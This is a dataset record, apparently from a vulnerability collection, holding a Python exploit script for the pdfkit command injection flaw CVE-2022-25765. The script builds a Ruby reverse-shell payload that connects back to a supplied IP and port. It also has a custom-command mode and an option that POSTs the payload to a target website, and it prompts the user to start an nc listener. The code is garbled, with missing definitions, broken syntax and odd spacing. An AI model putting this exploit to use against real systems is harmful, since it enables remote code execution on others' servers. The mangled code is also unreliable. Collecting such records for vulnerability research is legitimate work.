{
    "text": "vul_name : pdfkit v0.8.7.2 Command Injection ， vul_cve : CVE-2022-25765 ， vul_poc :  #  ! /usr/bin/env python3 ，  # Exploit Title : pdfkit v0.8.7.2 - Command Injection ，  # Date : 02/23/2023 ，  # Exploit Author : UNICORD ( NicPWNs & Dev-Yeoj )  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 0.0.0-0.8.7.2 ，  # Tested on : pdfkit 0.8.6 ，  # CVE : CVE-202225765 ，  # Source :  ，  # Description : The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized. ，  # Imports ， from urllib.parse import quote ， red = '\\033 [ 91m' ， gold = '\\033 [ 93m' ， blue = '\\033 [ 36m' ， green = '\\033 [ 92m' ， no = '\\033 [ 0m' ，  # Print UNICORD ASCII Art ， print ( rf\" ， {color.red} _ _ , {color.gold}/{color.red}_{color.no} {color.blue}_ _ _ _ _{color.no} ， {color.red} , ` (  ) _ (  ) -\\ | {color.blue}/ / / / | / / _/ _/ _ \\/ _ \\/ _ \\{color.no} ， {color.red} | / | `-. {color.blue}/ /_/ / / / /_/ /_/ / , _/ / /{color.no} ， {color.green}_V_v_{color.red} ! {color.green}_{color.red} ! {color.green}_{color.red} ! {color.green}_V_{color.blue}\\_/_/ | _/_/\\_/\\_/_/ | _/_/{color.green}.{color.no} ， \" )  ，  # Print exploit help menu ， print ( r\"UNICORD Exploit for CVE-202225765 ( pdfkit ) - Command Injection ， Usage :  ， python3 exploit-CVE-202225765.py -c <command> ， python3 exploit-CVE-202225765.py -s <local-IP> <local-port> ， python3 exploit-CVE-202225765.py -c <command> [ -w < -p <parameter> ]  ， python3 exploit-CVE-202225765.py -s <local-IP> <local-port> [ -w < -p <parameter> ]  ， python3 exploit-CVE-202225765.py -h ， Options :  ， -c Custom command mode. Provide command to generate custom payload with. ， -s Reverse shell mode. Provide local IP and port to generate reverse shell payload with. ， -w URL of website running vulnerable pdfkit. ( Optional )  ， -p POST parameter on website running vulnerable pdfkit. ( Optional )  ， -h Show this help menu. ， \" )  ， exit (  )  ， yield cursor ， spinner = spinning_cursor (  )  ， sys.stdout.write ( next ( spinner )  ， sys.stdout.flush (  )  ， time.sleep ( 0.1 )  ， sys.stdout.write ( '\\b' )  ，  # Run the exploit ， UNICORD_ASCII (  )  ， print ( f\"{color.blue}UNICORD : {color.red}Exploit for CVE-202225765 ( pdfkit ) - Command Injection{color.no}\" )  ， loading ( 15 )  ， print ( f\"{color.blue}OPTIONS : {color.gold}{modes [ exploitMode ] }{color.no}\" )  ， print ( f\"{color.blue}PAYLOAD : {color.gold}\" + payload + f\"{color.no}\" )  ， print (  ， f\"{color.blue}WARNING : {color.gold}Wrap custom command in \\\"quotes\\\" if it has spaces.{color.no}\" )  ， print (  ， f\"{color.blue}LOCALIP : {color.gold}{listenIP} : {listenPort}{color.no}\" )  ， print (  ， f\"{color.blue}WARNING : {color.gold}Be sure to start a local listener on the above IP and port. \\\"nc -lnvp {listenPort}\\\".{color.no}\" )  ， print ( f\"{color.blue}WEBSITE : {color.gold}{website}{color.no}\" )  ， print ( f\"{color.blue}POSTARG : {color.gold}{postArg}{color.no}\" )  ， print (  ， f\"{color.blue}ERRORED : {color.red}Make sure website has schema ! Like \\\" ， exit (  )  ， postArg = postArg + \"=\" + quote ( payload , safe=\" )  ， response = requests.post ( website , postArg )  ， print (  ， f\"{color.blue}ERRORED : {color.red}Couldn't connect to website ! {color.no}\" )  ， exit (  )  ， loading ( 15 )  ， print ( f\"{color.blue}EXPLOIT : {color.gold}Payload sent to website ! {color.no}\" )  ， loading ( 15 )  ， print ( f\"{color.blue}SUCCESS : {color.green}Exploit performed action.{color.no}\" )  ， elif exploitMode = \"command\" :  ， print ( f\"{color.blue}WARNING : {color.gold}Wrap custom command in \\\"quotes\\\" if it has spaces.{color.no}\" )  ， loading ( 15 )  ， print (  ， f\"{color.blue}EXPLOIT : {color.green}Copy the payload above into a PDFKit.new (  ) .to_pdf Ruby function or any application running vulnerable pdfkit.{color.no}\" )  ， elif exploitMode = \"shell\" :  ， print ( f\"{color.blue}LOCALIP : {color.gold}{listenIP} : {listenPort}{color.no}\" )  ， print ( f\"{color.blue}WARNING : {color.gold}Be sure to start a local listener on the above IP and port.{color.no}\" )  ， loading ( 15 )  ， print (  ， f\"{color.blue}EXPLOIT : {color.green}Copy the payload above into a PDFKit.new (  ) .to_pdf Ruby function or any application running vulnerable pdfkit.{color.no}\" )  ， exit (  )  ， args = [ '-h' , '-c' , '-s' , '-w' , '-p' ]  ， modes = {'command' : 'Custom Command Mode' ,  ， 'shell' : 'Reverse Shell Mode' ,  ， 'webcommand' : 'Custom Command Send to Target Website Mode' ,  ， 'webshell' : 'Reverse Shell Sent to Target Website Mode'} ， postArg = \"url\" ， help (  )  ， elif args [ 1 ] in sys.argv and not args [ 2 ] in sys.argv :  ， raise ， command = sys.argv [ sys.argv.index ( args [ 1 ]  ) + 1 ]  ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a custom command ! \\\"-c <command>\\\"{color.no}\" )  ， exit (  )  ， payload = f\" ， mode = \"command\" ， elif args [ 2 ] in sys.argv and not args [ 1 ] in sys.argv :  ， raise ， listenIP = sys.argv [ sys.argv.index ( args [ 2 ]  ) + 1 ]  ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a target and port ! \\\"-s <target-IP> <target-port>\\\"{color.no}\" )  ， exit (  )  ， raise ， listenPort = sys.argv [ sys.argv.index ( args [ 2 ]  ) + 2 ]  ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a target port ! \\\"-t <target-IP> <target-port>\\\"{color.no}\" )  ， exit (  )  ， payload = f\" -rsocket -e'spawn ( \\\"sh\\\" ,  [  : in ,  : out ,  : err ] =>TCPSocket.new ( \\\"{str ( listenIP ) }\\\" , \\\"{str ( listenPort ) }\\\" ) '`\" ， mode = \"shell\" ， help (  )  ， raise ， website = sys.argv [ sys.argv.index ( args [ 3 ]  ) + 1 ]  ， mode = \"web\" + mode ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a target site and post parameter ! \\\"-w < -p <parameter>\\\"{color.no}\" )  ， exit (  )  ， raise ， postArg = sys.argv [ sys.argv.index ( args [ 4 ]  ) + 1 ]  ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a target site and post parameter ! \\\"-w < -p <parameter>\\\"{color.no}\" )  ， exit (  )  ， elif args [ 3 ] in sys.argv or args [ 4 ] in sys.argv :  ， print (  ， f\"{color.blue}ERRORED : {color.red}Provide a target site and post parameter ! \\\"-w < -p <parameter>\\\"{color.no}\" )  ， exit (  )  ， exploit ( payload , mode , postArg ) ",
    "time": "2023.04.07"
}